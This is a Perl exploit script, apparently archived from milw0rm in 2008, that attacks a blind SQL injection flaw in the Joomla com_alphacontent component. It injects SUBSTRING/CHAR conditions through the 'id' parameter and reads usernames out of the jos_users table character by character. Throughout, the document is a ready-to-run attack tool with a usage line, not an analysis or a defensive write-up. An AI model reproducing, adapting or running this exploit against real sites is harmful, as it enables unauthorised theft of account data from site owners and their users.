#!/usr/bin/perl
#eSploit Framework - Inphex
use Digest::MD5 qw(md5 md5_hex md5_base64);
use LWP::UserAgent;
use HTTP::Cookies;
use Switch;
$host_ = shift;
$path_ = shift;
$id_ = shift;
$non_find = shift; #choose anything thats inside the article of id
$column = "username"; #change if needet
$table = "jos_users"; #change if needet
print "usage: $0 http://host.com / 17 Following";
$info{'info'} = {
 "author" => ["cO2,Inphex"],
 "name" => ["Joomla com_alphacontent Blind SQL Injection"],
 "version" => [],
 "description" => ["This Script will exploit a Blind SQL Injection vulnerability in com_alphacontent\n"],
 "options" =>
 {
  "agent" => "", 
  "proxy" => "", 
  "default_headers" => [ 
   ["key","value"]],
  "timeout" => 2,
  "cookie" =>    
  {
   "cookie" => ["key=value"],
  },
 },
 "sending_options" =>
 {
   "host" => $host_,
   "path" => $path_."index.php",          
      "port" => 80,                 
   "method_a" => "SQL_INJECTION_BLIND", 
   "attack" =>
  {
    "option" => ["get","option","com_alphacontent"],
    "section" => ["get","section","3"],
    "task" => ["get","task","view"],
    "cat" => ["get","cat","3"],
    "sql" => ["get","id","".$id_."%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20".$table."%20LIMIT%200,1),\$h,1)=CHAR(\$i)"], 
    "regex" => [[$non_find]],
  },
 },
};
&start($info{'info'},222);
sub start
{
 $a_ = shift;
 $id = shift;
 $get_dA = get_d_p_s("get");
 $post_dA = get_d_p_s("post");
 my ($x,$c,$m,$h,$ff,$kf,$hp,$c,$cccc) = (0,0,0,0,0,0,0,0,0);
 my $jj = 1;
 my $ii = 48;
    my $hh = 1;
 my $ppp = 0;
 my $s = shift;
 my $a = "";
 my $res_p = "";
 my $h = "";
 ($h_host_h_xdsjaop,$h_path_h_xdsjaop,$h_port_h_xdsjaop,$method_m) = ($a_->{'sending_options'}{'host'},$a_->{'sending_options'}{'path'},$a_->{'sending_options'}{'port'},$a_->{'sending_options'}{'method_a'});
 $ua = LWP::UserAgent->new;
 $ua->timeout($a_->{'options'}{'timeout'}); 
 if ($a_->{'options'}{'proxy'}) {
     $ua->proxy(['http', 'ftp'] => $a_->{'options'}{'proxy'});
 }
 $agent = $a_->{'options'}{'agent'} || "Mozilla/5.0";
 $ua->agent($agent);
 {                                                
  while (($k,$v) = each(%{$a_}))
   {
   if ($k ne "options" && $k ne "sending_options")
    {
    foreach $r (@{$a_->{$k}})
     {
     if ($a_->{$k}[0])
      {
      print $k.":".$a_->{$k}[0]."\n";
      }
     }
    }
   }

  foreach $j (@{$a_->{'options'}{'default_headers'}})
   {   
   $ua->default_headers->push_header($a_->{'options'}{'default_headers'}[$m][0] => $a_->{'options'}{'default_headers'}[$m][1]);
   $m++;
   }
  if ($a_->{'options'}{'cookie'}{'cookie'}[0])
   {         
   $ua->default_headers->push_header('Cookie' => $a_->{'options'}{'cookie'}{'cookie'}[0]);
   }
   
 }
 switch ($method_m)       
 {
  case "attack" { &attack();}
  case "SQL_INJECTION_BLIND" { &sql_injection_blind();}
  case "REMOTE_COMMAND_EXECUTION" { &attack();}
  case "REMOTE_CODE_EXECUTION" {&attack();}
  case "REMOTE_FILE_INCLUSION" { &attack();}
  case "LOCAL_FILE_INCLUSION" { &attack(); }
  else { &attack(); } 
 }

 sub attack
 {
  
  if ($post_dA eq "") {
   $method = "get";
  } elsif ($post_dA ne "")
  {
   $method = "post";
  }
  if ($method eq "get") { 
   $res_p = get_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA);
   ${$a_}{$id}{'content'} = $res_p;
   foreach $a (@{$a_->{'sending_options'}{'attack'}{'regex'}})
    {
    $res_p =~ /$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/;
    
    while ($jj <= $a_->{'sending_options'}{'attack'}{'regex'}[$h][1])
     {
     if (${$jj} ne "")
      {
      ${$a_}{$id}{'regex'}[$h] = ${$jj};
      }
      $jj++;
     }
     $h++;
    }
  } elsif ($method eq "post")
  {
   $res_p = post_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA,"application/x-www-form-urlencoded",$post_dA);
  
   ${$a_}{$id}{'content'} = $res_p;
   foreach $a (@{$a_->{'sending_options'}{'attack'}{'regex'}})
    {
    $res_p =~ /$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/;
    while ($jj <= $a_->{'sending_options'}{'attack'}{'regex'}[$h][1])
     {
     if (${$jj} ne "")
      {
      ${$a_}{$id}{'regex'}[$h] = ${$jj};
      }
      $jj++;
     }
     $h++;
    }
  }
 }
 sub sql_injection_blind
 {
  syswrite STDOUT,$column.":";
  while ()
   {
   while ($ii <= 90)
    {
    if(check($ii,$hh) == 1)
    {
     syswrite STDOUT,lc(chr($ii));
     $hh++;
     $chr = $chr.chr($ii);
     }
     $ii++;
   }
   push(@ffs,length($chr));
   if (($#ffs -1) == $ffs)
    {
    print "\nFinished/Error\n";
    exit;
    }
    $ii = 48;
  }
 }
 sub check($$)
 {
  $ii = shift;
  $hh = shift;
  if (get_d_p_s("post") ne "")
   {
   $method = "post";
  } else { $method = "get";}
  if ($method eq "get")
   {
   $ppp++;
   $query = modify($get_dA,$ii,$hh);
   $res_p = get_data($h_host_h_xdsjaop,$a_->{'sending_options'}{'path'}."?".$query);
   foreach $a (@{$a_->{'sending_options'}{'attack'}{'regex'}})
    {
    if ($res_p =~m/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/)
     {
     return 1;
     }
     else
    {
      return 0;
    }
    $h++;
   }
  } elsif ($method eq "post")
   {
   $ppp++;
   $query_g = modify($get_dA,$ii,$hh);
   $query_p = modify($post_dA,$ii,$hh);
   
   $res_p = post_data($h_host_h_xdsjaop,$a_->{'sending_options'}{'path'}."?".$query_g,"application/x-www-form-urlencoded",$query_p);
   foreach $a (@{$a_->{'sending_options'}{'attack'}{'regex'}})
    {
    if ($res_p =~m/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/)
     {
     return 1;
     }
     else
     {
      return 0;
     }
    $h++;
   }
  }
 }
    sub modify($$$)
 {
     $string = shift;
     $replace_by = shift;
     $replace_by1 = shift;
     if ($string !~/\$i/ && $string !~/\$h/) {
      print $string;
         } elsif ($string !~/\$i/)
  {
          $ff = substr($string,0,index($string,"\$h"));
             $ee =  substr($string,rindex($string,"\$h")+2);
             $string = $ff.$replace_by1.$ee;
             return $string;
  } elsif ($string !~/\$h/)
  {
         $f = substr($string,0,index($string,"\$i"));
         $e = substr($string,rindex($string,"\$i")+2);
         $string = $f.$replace_by.$e;
      return $string;
  } else
  {
      $f = substr($string,0,index($string,"\$i"));
         $e = substr($string,rindex($string,"\$i")+2);
         $string = $f.$replace_by.$e;
      $ff = substr($string,0,index($string,"\$h"));
         $ee =  substr($string,rindex($string,"\$h")+2);
         $string = $ff.$replace_by1.$ee;
      return $string;
  }
 }
 sub get_d_p_s
 {
  $g_d_p_s = shift;
  $post_data = "";
  $get_data = "";
  $header_data = "";
  %header_dA = ();
  while (($k,$v) = each(%{$a_->{'sending_options'}{'attack'}}))
   {
   if ($a_->{'sending_options'}{'attack'}{$k}[0] =~ "get")
    {
    $method = "get"; push(@get,$a_->{'sending_options'}{'attack'}{$k}[1]."=".$a_->{'sending_options'}{'attack'}{$k}[2]);
    }
    elsif ($a_->{'sending_options'}{'attack'}{$k}[0] =~ "post")
    {
     $method = "post"; push(@post,$a_->{'sending_options'}{'attack'}{$k}[1]."=".$a_->{'sending_options'}{'attack'}{$k}[2]);
     }
     elsif ($a_->{'sending_options'}{'attack'}{$k}[0] =~ "header")
    {
            $header_dA{$a_->{'sending_options'}{'attack'}{$k}[1]} = $a_->{'sending_options'}{'attack'}{$k}[2];
    }
    $hp++;
   }
  $yy = $#get;
  while ($bb <= $#get)
   {
   $get_data .= $get[$yy]."&";
   $bb++;
   $yy--;
   }
  $l = $#post;
  while ($k <= $#post)
   {
   
   $post_data .= $post[$l]."&";
   $k++;
   $l--;
   }
  if ($g_d_p_s eq "get")
   {
   
   return $get_data;
   }
   elsif ($g_d_p_s eq "post")
  {
   return $post_data;
  } elsif ($g_d_p_s eq "header")
  {
   return %header_dA;
  }
 }
 sub get_data
 {
  $h_host_h_xdsjaop = shift;
  $h_path_h_xdsjaop = shift;
  %hash = get_d_p_s("header");
     while (($u,$c) = each(%hash))
   {
   $ua->default_headers->push_header($u => $c);
   }
  $req = $ua->get($h_host_h_xdsjaop.$h_path_h_xdsjaop);
  return $req->content;
 }
 sub post_data
 {
  $h_host_h_xdsjaop = shift;
  $h_path_h_xdsjaop = shift;
  $content_type = shift;
  $send = shift;
  %hash = get_d_p_s("header");
     while (($u,$c) = each(%hash))
   {
      $ua->default_headers->push_header($u => $c);
   }
  $req = HTTP::Request->new(POST => $h_host_h_xdsjaop.$h_path_h_xdsjaop);
  $req->content_type($content_type);
  $req->content($send);
  $res = $ua->request($req);
  return $res->content;
 }
}

# milw0rm.com [2008-04-27]
